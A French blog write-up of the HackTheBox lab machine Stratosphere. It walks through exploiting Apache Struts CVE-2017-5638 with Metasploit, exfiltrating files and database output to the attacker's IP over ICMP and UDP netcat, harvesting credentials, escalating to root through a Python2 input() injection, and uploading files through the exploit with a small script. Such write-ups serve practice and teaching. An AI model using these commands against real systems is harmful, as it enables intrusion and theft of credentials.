# Solution du CTF Stratosphere de HackTheBox

Yet Another HackTheBox CTF
--------------------------

En me lançant sur le CTF *Stratosphere* je me doutais que ce serait la prochaine machine à être retirée et comme je me suis aussi attaqué à *SecNotes* l'annonce du retrait de *Stratosphere* m'a malgré tout pris de cours. Il était temps de concentrer mon temps sur ce dernier pour le terminer :) Voici donc le write-up de ce CTF sympathique.  

Equifaxé
--------

La machine en question dispose de 3 ports ouverts : un port standard SSH, et deux serveurs web sur les ports 80 et 8080.  

Après une vérification que le second n'est pas un proxy (*curl -x http://10.10.10.64:8080/ http://mon\_ip/*) il semble à première vue que les deux ports fournissent le même contenu.  

Le serveur ne révèle pas sa bannière, toutefois si on demande un fichier qui n'existe pas, la mention (*Apache Tomcat/8.5.14 (Debian)*) apparaît dans le message d'erreur 404.  

Un dirbuster sur le port 80 remonte les dossier suivants :  

```plain
http://10.10.10.64/manager/ - HTTP 302 (0 bytes, plain) redirects to /manager/html
http://10.10.10.64/Monitoring/ - HTTP 200 (199 bytes, plain)
```

La première adresse correspond à l'interface manager de *Tomcat*, déjà rencontrée sur un autre challenge de HTB. Mais ici l'utilisation de comptes par défaut ou l'utilisation d'un module de brute-force (via *Metasploit* par exemple) n'aboutit nul part.  

Sous le dossier *Monitoring* on trouve différentes pages avec l'extension *.action* mais le site ne semble être qu'une coquille vide, toute action menant à un message d'erreur (*This feature is under construction*).  

On remarque tout de même un pattern dans le format des URLs (première lettre en majuscule), j'ai donc lancé une recherche sous cette arborescence en appliquant préalablement un *capitalize()* sur les mots de mon dictionnaire.  

Parmi les résultats obtenus le plus intéressant est le script *Login\_db.action* qui retourne une stack trace faisait référence à *Struts* (un framework J2E).  

![HTB Stratosphere Struts stack trace](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/stratos_stacktrace.png)

Une recherche dans *Metasploit* retourne une poignée d'exploits en en regardant les infos détaillées de chaque module on voit parfois une mention à un script *HelloWorld.action*.  

Est-ce un placeholder ou une véritable réféence à un script présent par défaut ? Toujours est-il qu'il y a bien un *HelloWorld.action* sur la machine du challenge :)  

![HTB Stratosphere Equihax Struts](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/stratos_struts.png)

On devine un clin d’œil au hack de la société *Equifax*. Cette dernière a été victime d'une intrusion médiatisée via l'exploitation de la faille dans Struts [CVE-2017-5638](https://www.cvedetails.com/cve/CVE-2017-5638/).  

On s'empresse alors d'utiliser le module *Metasploit* correspondant mais malgré plusieurs payloads de reverse shell utilisés force est de constater qu'on est plutôt limité.  

Pourtant l'exécution de commande fonctionne car on si on se ping on peut voir les messages nous parvenir :  

```plain
msf exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting                        Required  Description
   ----       ---------------                        --------  -----------
   Proxies                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.10.10.64                            yes       The target address
   RPORT      8080                                   yes       The target port (TCP)
   SSL        false                                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /Monitoring/example/HelloWorld.action  yes       The path to a struts application action
   VHOST                                             no        HTTP server virtual host

Payload options (cmd/unix/generic):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute

Exploit target:

   Id  Name
   --  ----
   0   Universal

msf exploit(multi/http/struts2_content_type_ognl) > set CMD "ping -c 3 10.10.14.209"
CMD => ping -c 3 10.10.14.209
msf exploit(multi/http/struts2_content_type_ognl) > exploit
[*] Exploit completed, but no session was created.
```

On est de tout évidence en présence de règles de pare feu assez strictes concernant le trafic sortant :( (et entrant puisque les ports non ouverts sont filtrés)  

UDP semble fonctionner à moitié... c'est à dire que si on utilise le payload de reverse shell UDP via socat (proposé par *Metasploit*) alors on obtient l'invite de commande... puis plus rien.  

Cette fois il semble que seul le trafic sortant soit autorisé pour UDP : UDP étant un protocole *non connecté*, si on tente d'envoyer une commande il est considéré comme une nouvelle communication (et non comme partie d'une communication existante).  

Une autre solution est d'exfiltrer les données via ICMP comme c'était le cas pour le CTF Persistence :  

```plain
msf exploit(multi/http/struts2_content_type_ognl) > set CMD "ping -p `id | xxd -p -l 16` 10.10.14.209"
CMD => ping -p `id | xxd -p -l 16` 10.10.14.209
```

![HTB Stratosphere ICMP exfiltration with ping](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/stratos_ping_exfil.png)

Ça ne résous pas réellement notre problème à savoir le besoin d'obtenir un shell interactif (même sans pty, on ne fera pas les difficiles) ou une façon de déposer des fichiers sur la machine :(   

La solution la plus évidente serait d'ajouter notre clé SSH dans le fichier *.ssh/authorized\_keys* de l'utilisateur courant (*tomcat8*).  

Malheureusement son dossier personnel (*/var/lib/tomcat8* ne nous autorise pas l'écriture).  

La machine n'a pas non plus d'adresse IPv6... Comme dirait les fans de [NetHack](https://fr.wikipedia.org/wiki/NetHack), la *DevTeam* a pensé à tout :D  

Go go gadgeto enumerate
-----------------------

Déçu par ce manque d'ouverture d'esprit, j'ai décidé de continuer à énumérer la machine avec *Metasploit* d'un côté et de l'autre un *Ncat* en écoute sur un port UDP, faute de mieux.  

La suite logique du CTF semblait consister à obtenir les identifiants du Tomcat pour passer à un autre exploit bien connu :  

```plain
msf exploit(multi/http/struts2_content_type_ognl) > set CMD "cat /etc/tomcat8/tomcat-users.xml|netcat -u 10.10.14.209 9999"
CMD => cat /etc/tomcat8/tomcat-users.xml|netcat -u 10.10.14.209 9999
```

Les infos obtenues semblaient tout à fait réalistes :  

```html
<user username="teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$" roles="manager-gui,admin-gui" />
```

Malheureusement elles se sont révélées être d'aucune utilité ici...  

Le mot de passe ne nous permet pas non plus d'accéder en SSH au compte utilisateur présent sur la machine :  

```plain
richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
```

Un bon gros *grep* des familles sur le terme *admin* permettra finalement de faire remonter le fichier */var/lib/tomcat8/db\_connect* (le nom du fichier ne semble pas standard d'après la quantité de résultats sur Google).  

```plain
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

En listant les processus j'ai préalablement remarqué la présence d'un serveur MySQL. Sert-il à quelque chose ? Il suffit de passer les identifiants et la requête sur la ligne de commande (sans oublier la redirection d'erreur) :  

```bash
echo 'show databases;'|mysql -uadmin -padmin 2>&1|netcat -u 10.10.14.209 8888
```

Finalement on obtient un retour positif :  

```plain
devloop@kali:~/Documents/stratosphere$ ncat -l -p 8888 -v -u
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.64.
Database
information_schema
users
```

On enchaîne sur un *show tables* puis un *select \** :  

```plain
Tables_in_users
accounts

fullName    password    username
Richard F. Smith    9tc*rhKuG5TyXvUJOrE^5CK7k   richard
```

Ça y est on le tient enfin le mot de passe de cet [enc\*\*eur de maman](https://www.youtube.com/watch?v=Q_2837XvxGo) !  

Python skills 101
-----------------

L'accès SSH nous permet d'obtenir le flag utilisateur (*e610b298611fa732fca1665a1c02336b*)  

```plain
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

Une entrée sudo nous permet d'exécuter un script via Python2 ou Python3. Bien sûr on ne dispose pas d'autorisations en récrire sur ce script dont voici le contenu :  

```python
#!/usr/bin/python3
import hashlib

def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

Ça semblait un peut gros d'avoir à résoudre un exercice style [jeopardy](https://en.wikipedia.org/wiki/Capture_the_flag) après être passé par des étapes que l'on aurait pu croiser dans [la réalité vraie](https://www.youtube.com/watch?v=QwVK_QBdK2A).  

Ici, on voit clairement la présence d'*env\_reset* dans la ligne sudo donc pas de bypass via une variable d'environnement possible (*PYTHONPATH*, *PYTHONSTARTUP*, etc).  

Il est temps de se pencher sur le contenu du code et avec mon background Python j'ai rapidement tilté sur l'utilisation de *input()* [qui est considéré non-sûr via Python2](https://stackoverflow.com/questions/31175820/simple-explanation-of-security-issues-related-to-input-vs-raw-input), ou devrais-je plutôt dire [c'est une feature expliquée noir sur blanc](https://docs.python.org/2.7/library/functions.html#input).  

```plain
richard@stratosphere:~$ sudo python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__("os").system("/bin/bash -p")
root@stratosphere:/home/richard# id
uid=0(root) gid=0(root) groups=0(root)
root@stratosphere:/home/richard# cd /root
root@stratosphere:~# cat root.txt
d41d8cd98f00b204e9800998ecf8427e
root@stratosphere:~# exit
exit
Traceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 8, in question
    md5.update(q1.encode())
AttributeError: 'int' object has no attribute 'encode'
```

Bonux
-----

Pour obtenir un shell plus tôt sur ce CTF on aurait pu déposer d'un shell ICMP [comme celui-ci](https://github.com/inquisb/icmpsh). Il n'en reste pas moins qu'il faut être capable de déposer un fichier sur la machine.  

J'ai écrit un script qui effectue cette opération en encodant un fichier en base64 et l'envoi ligne par ligne sur la machine cible avant de le décoder :  

```python
import os
import sys

filename = sys.argv[1]
dest = "/tmp/{}".format(os.path.basename(filename))

os.system("rm /tmp/yolo 2>/dev/null; base64 '{}' > /tmp/yolo".format(filename))
os.system('python 41570.py http://10.10.10.64/Monitoring/example/HelloWorld.action "rm /tmp/yolo 2>/dev/null; touch /tmp/yolo"')
with open("/tmp/yolo") as fd:
    for line in fd:
        line = line.strip()
        os.system('python 41570.py http://10.10.10.64/Monitoring/example/HelloWorld.action "echo {} >> /tmp/yolo"'.format(line))

os.system('python 41570.py http://10.10.10.64/Monitoring/example/HelloWorld.action "base64 -d /tmp/yolo > {}"'.format(dest))
```

Le code est un peu crado (beaucoup d'appel à *system())*, il fait appel [à un exploit](https://www.exploit-db.com/exploits/41570/) pour la même faille *Struts*.  

Ça m'a ainsi permis d'uploader un [LinEnum](https://github.com/rebootuser/LinEnum) qui ne m'a finalement rien rapporté.  

That's about it
---------------

[Comme dirait Garbage](https://www.youtube.com/watch?v=0TP6GoERYPo)...   

Ce fut un CTF intéressant de part ses règles de pare feu et son énumération locale qui a été assez laborieuse :p

*Published September 01 2018 at 18:56*